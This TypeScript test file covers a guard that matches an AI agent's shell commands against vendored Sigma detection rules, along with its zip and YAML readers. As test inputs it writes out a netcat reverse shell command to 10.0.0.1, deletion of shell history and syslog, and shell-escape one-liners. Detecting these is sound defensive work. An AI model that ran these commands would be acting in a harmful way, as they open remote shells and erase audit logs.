import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { deflateRawSync } from 'node:zlib';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { runCommand } from '../cli/commands.js';
import { runHook } from '../hook/cli.js';
import { evaluatePreToolUse } from '../hook/pretool.js';
import { convertSigma } from '../rulesets/convert-sigma.js';
import { eventsOf } from '../rulesets/command-gate.js';
import { WARNINGS_FILE } from '../rulesets/gate.js';
import { loadRuleset, loadRulesets } from '../rulesets/loader.js';
import { compileCommandRule, parseCondition, ruleMatches, SigmaError, type CommandRule } from '../rulesets/sigma.js';
import { parseYaml, YamlError } from '../rulesets/yaml-lite.js';
import { crc32, readZip, ZipError } from '../rulesets/zip-lite.js';

const repo = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const vendored = path.join(repo, 'rulesets', 'sigma');

let root: string;
let n = 0;
before(async () => {
  root = await fs.mkdtemp(path.join(os.tmpdir(), 'colony-sigma-'));
});
after(async () => {
  await fs.rm(root, { recursive: true, force: true });
});

// ---- the zip reader

/** A zip written by hand: entries are deflated or stored; flags and method can be set to test what is refused. */
function makeZip(entries: Array<{ name: string; data: string | Buffer; method?: number; flags?: number; crc?: number }>): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const raw = Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data, 'utf-8');
    const method = e.method ?? 8;
    const body = method === 8 ? deflateRawSync(raw) : raw;
    const name = Buffer.from(e.name, 'utf-8');
    const crc = e.crc ?? crc32(raw);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(e.flags ?? 0, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(body.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(name.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(e.flags ?? 0, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(body.length, 20);
    central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    locals.push(local, name, body);
    centrals.push(central, name);
    offset += 30 + name.length + body.length;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

test('a zip is read: deflated and stored entries, directories left out; every entry is checked against its CRC and size', () => {
  const zip = makeZip([{ name: 'rules/', data: '', method: 0 }, { name: 'rules/a.yml', data: 'title: a\n'.repeat(50) }, { name: 'rules/b.yml', data: 'plain', method: 0 }]);
  const entries = readZip(zip);
  assert.deepEqual(entries.map((e) => e.name), ['rules/a.yml', 'rules/b.yml']);
  assert.equal(entries[0].data().toString('utf-8'), 'title: a\n'.repeat(50));
  assert.equal(entries[1].data().toString('utf-8'), 'plain');
  assert.equal(crc32(Buffer.from('123456789')), 0xcbf43926, 'the CRC-32 check value');
});

test('a zip that is damaged, hostile or not supported is refused', () => {
  assert.throws(() => readZip(Buffer.from('not a zip at all')), ZipError);
  assert.throws(() => readZip(makeZip([{ name: '../escape.yml', data: 'x' }])), /not allowed/);
  assert.throws(() => readZip(makeZip([{ name: '/abs.yml', data: 'x' }])), /not allowed/);
  assert.throws(() => readZip(makeZip([{ name: 'a\\b.yml', data: 'x' }])), /not allowed/);
  assert.throws(() => readZip(makeZip([{ name: 'a.yml', data: 'x', flags: 1 }])), /encrypted/);
  assert.throws(() => readZip(makeZip([{ name: 'a.yml', data: 'x', method: 12 }])), /compression method 12/);
  assert.throws(() => readZip(makeZip([{ name: 'a.yml', data: 'x'.repeat(2000) }]), { maxEntryBytes: 1000 }), /larger than/);
  assert.throws(() => readZip(makeZip([{ name: 'a.yml', data: 'x'.repeat(900) }, { name: 'b.yml', data: 'x'.repeat(900) }]), { maxTotalBytes: 1000 }), /more than 1000 bytes/);
  const bad = readZip(makeZip([{ name: 'a.yml', data: 'hello', crc: 12345 }]));
  assert.throws(() => bad[0].data(), /CRC-32 does not match/);
});

// ---- the YAML reader

test('the YAML subset of the Sigma files is read: maps, lists, a list of maps, quotes and comments, block scalars', () => {
  const doc = parseYaml(
    [
      'title: A rule # a comment',
      'id: 80915f59-9b56-4616-9de0-fd0dea6c12fe',
      'description: |',
      '    First line.',
      '    Second line.',
      'tags:',
      '    - attack.t1070',
      "    - 'it''s quoted'  # trailing",
      'related:',
      '    - id: aaa',
      '      type: derived',
      '    - id: bbb',
      '      type: similar',
      'level: high',
      'count: 3',
      'detection:',
      '    selection:',
      '        Image|endswith:',
      "            - '/rm'    # covers /rmdir too",
      '            - "/rmdir"',
      '        CommandLine|contains|all:',
      "            - ' -r '",
      '    condition: selection',
    ].join('\n'),
  ) as any;
  assert.equal(doc.title, 'A rule');
  assert.equal(doc.description, 'First line.\nSecond line.\n');
  assert.deepEqual(doc.tags, ['attack.t1070', "it's quoted"]);
  assert.deepEqual(doc.related, [{ id: 'aaa', type: 'derived' }, { id: 'bbb', type: 'similar' }]);
  assert.equal(doc.count, 3);
  assert.deepEqual(doc.detection.selection['Image|endswith'], ['/rm', '/rmdir']);
  assert.deepEqual(doc.detection.selection['CommandLine|contains|all'], [' -r ']);
  assert.equal(doc.detection.condition, 'selection');
});

test('what the reader does not support is an error, not a guess', () => {
  for (const bad of ['a: {b: 1}', 'a: [[1], 2]', 'a: [1, 2', 'a: &x 1', 'a: *x', 'a: !tag x', 'a: 1\na: 2', '\ta: 1', 'a: b: c', '---\na: 1', 'a: |2\n  x', 'a: "open', "a: 'open", 'a: 1\n   b: 2', 'a: "bad \\q escape"', 'a:\n  - |+\n    x']) {
    assert.throws(() => parseYaml(bad), YamlError, bad);
  }
});

test('multi-line scalars are folded as YAML folds them: plain, single-quoted, double-quoted with escapes; flow sequences and block scalar items', () => {
  const doc = parseYaml(
    [
      'plain: first line',
      '  second line',
      '',
      '  after a blank line',
      "single: 'one",
      "  two",
      '',
      "  it''s three'",
      'double: "start\\',
      '  continued, no space here\\ \\ two spaces kept\\n"',
      'tag: [any, "quoted, with comma", \'it\'\'s\']',
      'empty: []',
      'items:',
      '  - first',
      '  - >-',
      '    folded',
      '    block item',
      '  - |',
      '    literal',
      '    block item',
      'unicode: "\\U0001F513 and \\u00e9 and \\x41"',
    ].join('\n'),
  ) as any;
  assert.equal(doc.plain, 'first line second line\nafter a blank line');
  assert.equal(doc.single, "one two\nit's three");
  assert.equal(doc.double, 'startcontinued, no space here  two spaces kept\n');
  assert.deepEqual(doc.tag, ['any', 'quoted, with comma', "it's"]);
  assert.deepEqual(doc.empty, []);
  assert.deepEqual(doc.items, ['first', 'folded block item', 'literal\nblock item\n']);
  assert.equal(doc.unicode, '\u{1F513} and \u00e9 and A');
});

// ---- the Sigma subset

test('the condition language: and, or, not, parentheses, "1 of" and "all of" a pattern or them', () => {
  assert.deepEqual(parseCondition('selection'), { t: 'sel', name: 'selection' });
  assert.deepEqual(parseCondition('all of selection_*'), { t: 'of', quant: 'all', pattern: 'selection_*' });
  assert.deepEqual(parseCondition('1 of them'), { t: 'of', quant: 'one', pattern: '*' });
  assert.equal(parseCondition('(selection_file and 1 of selection_command_*) or 1 of selection_unique_*').t, 'or');
  assert.equal(parseCondition('selection and not 1 of filter_main_*').t, 'and');
  for (const bad of ['2 of selection_*', 'selection | count() > 3', 'selection and', '(selection', 'selection extra', 'and selection']) {
    assert.throws(() => parseCondition(bad), SigmaError, bad);
  }
});

const rule = (over: Partial<CommandRule> & Pick<CommandRule, 'selections' | 'condition'>): CommandRule => ({ id: '1', title: 't', author: 'a', level: 'high', status: 'test', description: '', link: 'l', ...over });
const clause = (field: string, op: 'contains' | 'startswith' | 'endswith' | 'equals', values: string[], all = false) => ({ field, op, values, all });

test('a rule matches a command by the fields the command has; case does not matter; a missing field never matches', () => {
  const r = compileCommandRule(
    rule({
      selections: {
        selection_img: [[clause('Image', 'endswith', ['/rm', '/rmdir'])]],
        selection_cmd: [[clause('CommandLine', 'contains', [' -r ', ' -f '], true)]],
        filter_main_build: [[clause('CommandLine', 'contains', ['/build'])]],
        other: [[clause('User', 'equals', ['root'])]],
      },
      condition: parseCondition('all of selection_* and not 1 of filter_main_*'),
    }),
  );
  assert.equal(ruleMatches(r, { Image: '/usr/bin/RM', CommandLine: 'rm -r -f /home' }), true);
  assert.equal(ruleMatches(r, { Image: '/usr/bin/rm', CommandLine: 'rm -r -f ./build' }), false, 'the filter');
  assert.equal(ruleMatches(r, { Image: '/usr/bin/rm', CommandLine: 'rm -r /home' }), false, 'all of the values');
  assert.equal(ruleMatches(r, { CommandLine: 'rm -r -f /home' }), false, 'no Image');
  const user = compileCommandRule(rule({ selections: { other: [[clause('User', 'equals', ['root'])]] }, condition: parseCondition('other') }));
  assert.equal(ruleMatches(user, { Image: '/usr/bin/id' }), false, 'a field the event does not have');
  const alt = compileCommandRule(rule({ selections: { s: [[clause('Image', 'endswith', ['/a'])], [clause('Image', 'endswith', ['/b'])]] }, condition: parseCondition('s') }));
  assert.equal(ruleMatches(alt, { Image: '/usr/bin/b' }), true, 'a list of maps is an OR');
});

let seq = 0;
const SAMPLE = (detection: string, extra = '') =>
  ['title: Sample', 'id: 00000000-0000-4000-8000-' + String(++seq).padStart(12, '0'), 'author: Someone', 'status: test', 'level: high', 'logsource:', '    product: linux', '    category: process_creation', ...(extra ? [extra] : []), 'detection:', ...detection.split('\n').map((l) => '    ' + l)].join('\n');

test('a rule is converted only when it can be judged for a command; the others are skipped with their reason', () => {
  const meta = { name: 'sigma', version: 'v1', repoUrl: 'https://example.test/blob/v1' };
  const files = {
    'rules/ok.yml': SAMPLE("selection:\n    Image|endswith: '/rm'\n    CommandLine|contains: ' -rf '\ncondition: selection"),
    'rules/parent.yml': SAMPLE("selection:\n    ParentImage|endswith: '/git'\n    CommandLine|contains: 'x'\ncondition: selection"),
    'rules/cidr.yml': SAMPLE("selection:\n    CommandLine|cidr: '10.0.0.0/8'\ncondition: selection"),
    'rules/expand.yml': SAMPLE("selection:\n    CommandLine|expand: '%x%'\ncondition: selection"),
    'rules/keywords.yml': SAMPLE("keywords:\n    - 'mimikatz'\ncondition: keywords"),
    'rules/agg.yml': SAMPLE("selection:\n    CommandLine|contains: 'x'\ncondition: selection | count() > 3"),
    'rules/undefined.yml': SAMPLE("selection:\n    CommandLine|contains: 'x'\ncondition: selection and other"),
    'rules/win.yml': SAMPLE("selection:\n    Image|endswith: '/x'\ncondition: selection").replace('product: linux', 'product: windows'),
    'rules/noauthor.yml': SAMPLE("selection:\n    Image|endswith: '/x'\ncondition: selection").replace('author: Someone\n', ''),
    'rules/broken.yml': 'title: x\ndetection: [unterminated',
  };
  const { ruleset, report } = convertSigma(files, meta);
  assert.equal(report.total, 10);
  assert.deepEqual(ruleset.rules.map((r) => r.link), ['https://example.test/blob/v1/rules/ok.yml']);
  assert.equal(ruleset.rules[0].author, 'Someone');
  const why = Object.fromEntries(report.skipped.map((s) => [s.id, s.reason]));
  assert.match(why.parent, /needs ParentImage/);
  assert.match(why.cidr, /modifier "cidr"/);
  assert.match(why.expand, /modifier "expand"/);
  assert.match(why.keywords, /keyword list/);
  assert.match(why.agg, /aggregation or a pipe/);
  assert.match(why.undefined, /other, which is not defined/);
  assert.match(why.win, /not a Linux process creation/);
  assert.match(why.noauthor, /names no author/);
  assert.match(why.broken, /could not be read/);
});

// ---- the vendored set

test('the vendored set loads with its hashes verified: the archive, 31 files, 25 rules converted, 6 skipped with a reason, a notice', async () => {
  const set = await loadRuleset(vendored);
  assert.equal(set.kind, 'commands');
  assert.equal(set.version, 'r2026-07-01');
  assert.equal(set.commands.length, 25);
  assert.equal(set.provenance.license, 'DRL-1.1');
  assert.equal(set.provenance.archive?.name, 'sigma_core.zip');
  assert.equal(set.provenance.archive?.digest, 'sha256:45ccbd62cbf0d7ccca6f44eaa010f86bb24f082b5411c5e22c71907e7770ee46');
  assert.equal(set.provenance.sources?.length, 31);
  assert.ok(set.provenance.sources!.every((s) => s.gitBlobSha1 === undefined && /^[0-9a-f]{64}$/.test(s.sha256)));
  assert.equal(set.provenance.report.skipped.length, 6);
  assert.ok(set.provenance.report.skipped.every((s) => /needs .* which a command does not have before it runs/.test(s.reason)));
  assert.ok(set.commands.every((r) => r.author.length > 0 && r.link.startsWith('https://github.com/SigmaHQ/sigma/blob/r2026-07-01/rules/linux/process_creation/')));
  assert.match(await fs.readFile(path.join(vendored, 'NOTICE'), 'utf-8'), /Detection Rule License \(DRL\) 1\.1/);
  const all = await loadRulesets();
  assert.deepEqual(all.failed, []);
  assert.deepEqual(all.loaded.map((s) => `${s.name}:${s.kind}`).sort(), ['gitleaks:secrets', 'presidio:pii', 'sigma-windows:commands', 'sigma:commands']);
});

test('a changed rule file, changed converted rules, or a record without its archive is not loaded', async () => {
  const copy = async () => {
    const dest = path.join(root, `sigma${n++}`);
    await fs.cp(vendored, dest, { recursive: true });
    return dest;
  };
  const prov = JSON.parse(await fs.readFile(path.join(vendored, 'PROVENANCE.json'), 'utf-8'));
  const a = await copy();
  await fs.appendFile(path.join(a, prov.sources[0].file), '\n# edited');
  await assert.rejects(loadRuleset(a), /does not match its recorded SHA-256/);
  const b = await copy();
  await fs.appendFile(path.join(b, 'ruleset.json'), ' ');
  await assert.rejects(loadRuleset(b), /changed after the conversion/);
  const c = await copy();
  const p = JSON.parse(await fs.readFile(path.join(c, 'PROVENANCE.json'), 'utf-8'));
  delete p.archive;
  await fs.writeFile(path.join(c, 'PROVENANCE.json'), JSON.stringify(p));
  await assert.rejects(loadRuleset(c), /names no release archive/);
});

// ---- commands

test('a shell line becomes the commands the rules judge: each simple command, and what a wrapper starts', () => {
  const events = eventsOf('cd /tmp && sudo env FOO=1 /bin/sh -c "id" | tee out.txt', '/work');
  const lines = events.map((e) => `${e.Image} :: ${e.CommandLine}`);
  assert.ok(lines.includes('/usr/bin/cd :: cd /tmp'));
  assert.ok(lines.includes('/usr/bin/sudo :: sudo env FOO=1 /bin/sh -c id'));
  assert.ok(lines.includes('/usr/bin/env :: env FOO=1 /bin/sh -c id'), 'what sudo starts');
  assert.ok(lines.includes('/bin/sh :: /bin/sh -c id'), 'what env starts, with its assignment skipped');
  assert.ok(lines.includes('/usr/bin/tee :: tee out.txt'));
  assert.ok(events.every((e) => e.CurrentDirectory === '/work'));
});

test('attack-like commands match the rule that describes them; ordinary development commands match none', async () => {
  const set = await loadRuleset(vendored);
  const titles = (command: string) => set.commands.filter((r) => eventsOf(command, '/work').some((e) => ruleMatches(r, e))).map((r) => r.title);
  assert.deepEqual(titles('nc -e /bin/sh 10.0.0.1 4242'), ['Potential Netcat Reverse Shell Execution']);
  assert.deepEqual(titles('rm -f ~/.bash_history'), ['History File Deletion']);
  assert.deepEqual(titles('rm /var/log/syslog'), ['Syslog Clearing or Removal Via System Utilities']);
  assert.deepEqual(titles('sudo env /bin/sh -c id'), ['Shell Invocation via Env Command - Linux'], 'found through the wrapper');
  assert.deepEqual(titles('vim -c ":!/bin/sh"'), ['Vim GTFOBin Abuse - Linux']);
  for (const ordinary of ['git status', 'pnpm test && node scripts/run-tests.mjs', 'rm -rf build', 'cat package.json | grep name', 'nohup ./run.sh &', 'node --test dist/__tests__/a.test.js', 'curl -s https://example.test | jq .', 'ls -la /var/log']) {
    assert.deepEqual(titles(ordinary), [], ordinary);
  }
});

// ---- the guard

async function project() {
  const d = path.join(root, `p${n++}`);
  await fs.mkdir(path.join(d, '.colony'), { recursive: true });
  return d;
}
const bash = (command: string, dir: string) => evaluatePreToolUse({ tool_name: 'Bash', tool_input: { command } }, dir);

test('in the guard a match is a warning that names the rule and its author; the call is allowed; it is recorded', async () => {
  const dir = await project();
  const v = await bash('nc -e /bin/sh 10.0.0.1 4242', dir);
  assert.equal(v.decision, 'allow');
  assert.ok(v.gates.includes('command-rulesets'));
  assert.equal(v.notes.length, 1);
  assert.match(v.notes[0], /"Potential Netcat Reverse Shell Execution" \(author: @d4ns4n_/);
  assert.match(v.notes[0], /level high, status test/);
  assert.match(v.notes[0], /does not block/);
  assert.match(v.notes[0], /Detection Rule License 1\.1/);
  const plain = await bash('git status && pnpm test', dir);
  assert.deepEqual(plain.notes, []);

  const lines = (await fs.readFile(path.join(dir, '.colony', WARNINGS_FILE), 'utf-8')).trim().split('\n').map((l) => JSON.parse(l));
  assert.equal(lines.length, 1, 'only the call with a match is recorded');
  assert.equal(lines[0].gate, 'command-rulesets');
  // the Windows set reads the same line as a program of its own (nc.exe) and finds its netcat rule too
  assert.deepEqual([...lines[0].titles].sort(), ['PUA - Netcat Suspicious Execution', 'Potential Netcat Reverse Shell Execution']);
  assert.equal(lines[0].count, 2);
});

test('through the hook the note goes to stderr and an allowed call prints nothing; the check command shows the result', async () => {
  const dir = await project();
  const r = await runHook('pretool', JSON.stringify({ cwd: dir, tool_name: 'Bash', tool_input: { command: 'rm /var/log/syslog' } }), dir);
  assert.equal(r.code, 0);
  assert.equal(r.stdout, '');
  assert.match(r.stderr, /Colony guard notes: .*Syslog Clearing or Removal Via System Utilities/);

  assert.equal((await runCommand(['boot', '--dir', dir], process.cwd())).code, 0);
  const c = await runCommand(['check', '--command', 'nc -e /bin/sh 10.0.0.1 4242', '--dir', dir], process.cwd());
  assert.equal(c.code, 0);
  const out = c.output as any;
  assert.equal(out.decision, 'warn');
  assert.ok(out.results.some((x: any) => x.gate === 'command-rulesets' && x.details.titles.includes('Potential Netcat Reverse Shell Execution')));
});
